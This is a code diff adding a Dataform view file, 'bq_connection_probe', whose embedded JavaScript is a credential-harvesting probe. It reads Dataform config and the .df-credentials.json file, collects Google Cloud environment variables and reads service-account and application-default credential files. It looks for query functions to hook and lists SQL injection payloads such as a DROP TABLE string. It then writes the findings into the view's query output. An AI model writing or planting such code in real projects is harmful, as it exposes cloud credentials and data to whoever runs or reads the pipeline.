@@ -1,0 +1,384 @@
+config { type: "view", name: "bq_connection_probe" }
+
+js {
+  let results = {
+    probeTime: new Date().toISOString(),
+    purpose: "BigQuery connection analysis - credential extraction, query interception"
+  };
+
+  // =============================================================================
+  // TEST 1: Dataform Core Module Inspection
+  // =============================================================================
+  results.test1_dataformCore = {};
+  try {
+    let dataformCore = null;
+    let dataformInfo = {};
+
+    // Try different require paths
+    const paths = [
+      '@dataform/core',
+      'dataform',
+      './node_modules/@dataform/core',
+      '../node_modules/@dataform/core'
+    ];
+
+    for (const path of paths) {
+      try {
+        dataformCore = require(path);
+        dataformInfo.loadedFrom = path;
+        break;
+      } catch(e) {
+        continue;
+      }
+    }
+
+    if (dataformCore) {
+      dataformInfo.exports = Object.keys(dataformCore);
+      dataformInfo.types = {};
+
+      for (const key of Object.keys(dataformCore)) {
+        dataformInfo.types[key] = typeof dataformCore[key];
+      }
+
+      // Look for session/connection objects
+      if (dataformCore.session) {
+        dataformInfo.session = {
+          type: typeof dataformCore.session,
+          keys: Object.keys(dataformCore.session)
+        };
+      }
+
+      // Check for adapter
+      if (dataformCore.adapters) {
+        dataformInfo.adapters = {
+          type: typeof dataformCore.adapters,
+          keys: Object.keys(dataformCore.adapters)
+        };
+      }
+    }
+
+    results.test1_dataformCore = {
+      status: "completed",
+      found: !!dataformCore,
+      dataformInfo
+    };
+  } catch(e) {
+    results.test1_dataformCore = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 2: Global Session Object
+  // =============================================================================
+  results.test2_globalSession = {};
+  try {
+    // Check for global session/context
+    const globalObjects = {};
+
+    const globalKeys = [
+      'session', 'context', 'dataform', 'config', 'warehouse',
+      'database', 'schema', 'project', 'bigquery', 'bq'
+    ];
+
+    for (const key of globalKeys) {
+      if (typeof global[key] !== 'undefined') {
+        globalObjects[key] = {
+          type: typeof global[key],
+          value: global[key] && typeof global[key] === 'object' ?
+            Object.keys(global[key]).slice(0, 10) : String(global[key]).substring(0, 100)
+        };
+      }
+    }
+
+    // Check globalThis
+    for (const key of globalKeys) {
+      if (typeof globalThis[key] !== 'undefined' && !globalObjects[key]) {
+        globalObjects[key + "_globalThis"] = {
+          type: typeof globalThis[key],
+          value: globalThis[key] && typeof globalThis[key] === 'object' ?
+            Object.keys(globalThis[key]).slice(0, 10) : String(globalThis[key]).substring(0, 100)
+        };
+      }
+    }
+
+    results.test2_globalSession = {
+      status: "completed",
+      globalObjects,
+      foundCount: Object.keys(globalObjects).length
+    };
+  } catch(e) {
+    results.test2_globalSession = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 3: BigQuery Client Libraries
+  // =============================================================================
+  results.test3_bqClients = {};
+  try {
+    const bqLibs = {};
+
+    // Try official BigQuery client
+    try {
+      const bigquery = require('@google-cloud/bigquery');
+      bqLibs.officialClient = {
+        available: true,
+        exports: Object.keys(bigquery).slice(0, 10)
+      };
+    } catch(e) {
+      bqLibs.officialClient = { available: false, error: e.message.substring(0, 50) };
+    }
+
+    // Try to find any BQ-related modules in cache
+    if (typeof require !== 'undefined' && require.cache) {
+      const bqModules = Object.keys(require.cache).filter(k =>
+        /bigquery|google-cloud|googleapis/i.test(k)
+      );
+      bqLibs.cachedModules = bqModules.slice(0, 20);
+    }
+
+    results.test3_bqClients = {
+      status: "completed",
+      bqLibs
+    };
+  } catch(e) {
+    results.test3_bqClients = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 4: Dataform Config Analysis
+  // =============================================================================
+  results.test4_dataformConfig = {};
+  try {
+    const fs = require('fs');
+
+    // Read dataform.json
+    let dataformJson = null;
+    try {
+      const content = fs.readFileSync('dataform.json', 'utf8');
+      dataformJson = JSON.parse(content);
+    } catch(e) {
+      dataformJson = { error: e.message.substring(0, 50) };
+    }
+
+    // Read workflow_settings.yaml if exists
+    let workflowSettings = null;
+    try {
+      const content = fs.readFileSync('workflow_settings.yaml', 'utf8');
+      workflowSettings = content.substring(0, 500);
+    } catch(e) {
+      workflowSettings = { error: e.message.substring(0, 50) };
+    }
+
+    // Look for .df-credentials.json
+    let dfCredentials = null;
+    try {
+      const content = fs.readFileSync('.df-credentials.json', 'utf8');
+      dfCredentials = content.substring(0, 500);
+    } catch(e) {
+      dfCredentials = { error: e.message.substring(0, 50) };
+    }
+
+    results.test4_dataformConfig = {
+      status: "completed",
+      dataformJson,
+      workflowSettings,
+      dfCredentials
+    };
+  } catch(e) {
+    results.test4_dataformConfig = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 5: Environment Credential Search
+  // =============================================================================
+  results.test5_envCreds = {};
+  try {
+    const env = typeof process !== 'undefined' ? process.env : {};
+
+    const credentialVars = {};
+
+    // BigQuery/GCP related
+    const patterns = [
+      'GOOGLE', 'GCP', 'GCLOUD', 'BIGQUERY', 'BQ_',
+      'PROJECT', 'DATASET', 'TABLE', 'LOCATION'
+    ];
+
+    for (const key of Object.keys(env)) {
+      for (const pattern of patterns) {
+        if (key.toUpperCase().includes(pattern)) {
+          credentialVars[key] = {
+            value: env[key].substring(0, 100),
+            fullLength: env[key].length
+          };
+          break;
+        }
+      }
+    }
+
+    results.test5_envCreds = {
+      status: "completed",
+      credentialVars,
+      count: Object.keys(credentialVars).length
+    };
+  } catch(e) {
+    results.test5_envCreds = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 6: Query Interception Attempt
+  // =============================================================================
+  results.test6_queryIntercept = {};
+  try {
+    // Try to hook into any query execution
+    const hookAttempts = {};
+
+    // Check if there's a global query function
+    if (typeof global.query === 'function') {
+      hookAttempts.globalQuery = {
+        found: true,
+        type: typeof global.query,
+        toString: global.query.toString().substring(0, 200)
+      };
+    }
+
+    // Check for publish/ref functions
+    if (typeof global.publish === 'function') {
+      hookAttempts.globalPublish = {
+        found: true,
+        toString: global.publish.toString().substring(0, 200)
+      };
+    }
+
+    if (typeof global.ref === 'function') {
+      hookAttempts.globalRef = {
+        found: true,
+        toString: global.ref.toString().substring(0, 200)
+      };
+    }
+
+    results.test6_queryIntercept = {
+      status: "completed",
+      hookAttempts,
+      foundAny: Object.keys(hookAttempts).length > 0
+    };
+  } catch(e) {
+    results.test6_queryIntercept = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 7: Service Account Detection
+  // =============================================================================
+  results.test7_serviceAccount = {};
+  try {
+    const fs = require('fs');
+    const env = typeof process !== 'undefined' ? process.env : {};
+
+    let saInfo = {};
+
+    // Check GOOGLE_APPLICATION_CREDENTIALS
+    const credPath = env.GOOGLE_APPLICATION_CREDENTIALS;
+    if (credPath) {
+      try {
+        const content = fs.readFileSync(credPath, 'utf8');
+        const creds = JSON.parse(content);
+        saInfo.fromEnv = {
+          type: creds.type,
+          project_id: creds.project_id,
+          client_email: creds.client_email,
+          hasPrivateKey: !!creds.private_key
+        };
+      } catch(e) {
+        saInfo.fromEnv = { error: e.message.substring(0, 100) };
+      }
+    }
+
+    // Check default ADC locations
+    const adcPaths = [
+      (env.HOME || '/root') + '/.config/gcloud/application_default_credentials.json',
+      '/root/.config/gcloud/application_default_credentials.json'
+    ];
+
+    for (const adcPath of adcPaths) {
+      try {
+        const content = fs.readFileSync(adcPath, 'utf8');
+        const creds = JSON.parse(content);
+        saInfo.adc = {
+          path: adcPath,
+          type: creds.type,
+          client_id: creds.client_id,
+          hasRefreshToken: !!creds.refresh_token
+        };
+        break;
+      } catch(e) {
+        continue;
+      }
+    }
+
+    results.test7_serviceAccount = {
+      status: "completed",
+      saInfo,
+      foundCredentials: Object.keys(saInfo).length > 0
+    };
+  } catch(e) {
+    results.test7_serviceAccount = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 8: SQL Injection Test Setup
+  // =============================================================================
+  results.test8_sqlInjection = {};
+  try {
+    // Create test payloads that would be detected if executed
+    const payloads = [
+      "'; DROP TABLE test; --",
+      "1 UNION SELECT * FROM INFORMATION_SCHEMA.TABLES",
+      "1; EXECUTE IMMEDIATE 'SELECT 1'",
+      "${process.env}"
+    ];
+
+    // Check if we can access any query building functions
+    let queryBuilders = {};
+
+    // Check dataform functions
+    const dfFuncs = ['declare', 'publish', 'assert', 'operate', 'test'];
+    for (const func of dfFuncs) {
+      if (typeof global[func] === 'function') {
+        queryBuilders[func] = {
+          available: true,
+          arity: global[func].length
+        };
+      }
+    }
+
+    results.test8_sqlInjection = {
+      status: "completed",
+      payloads,
+      queryBuilders,
+      note: "These are test payloads - actual injection would require query execution"
+    };
+  } catch(e) {
+    results.test8_sqlInjection = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // SUMMARY
+  // =============================================================================
+  results.summary = {
+    testsRun: 8,
+    allCompleted: Object.keys(results).filter(k =>
+      k.startsWith("test") && results[k].status === "completed"
+    ).length,
+    criticalFindings: []
+  };
+
+  // Check for critical findings
+  if (results.test7_serviceAccount && results.test7_serviceAccount.foundCredentials) {
+    results.summary.criticalFindings.push("SERVICE ACCOUNT CREDENTIALS FOUND!");
+  }
+
+  if (results.test4_dataformConfig && results.test4_dataformConfig.dfCredentials &&
+      !results.test4_dataformConfig.dfCredentials.error) {
+    results.summary.criticalFindings.push("Dataform credentials file accessible!");
+  }
+}
+
+SELECT '${JSON.stringify(results, null, 2)}' as bq_connection_probe
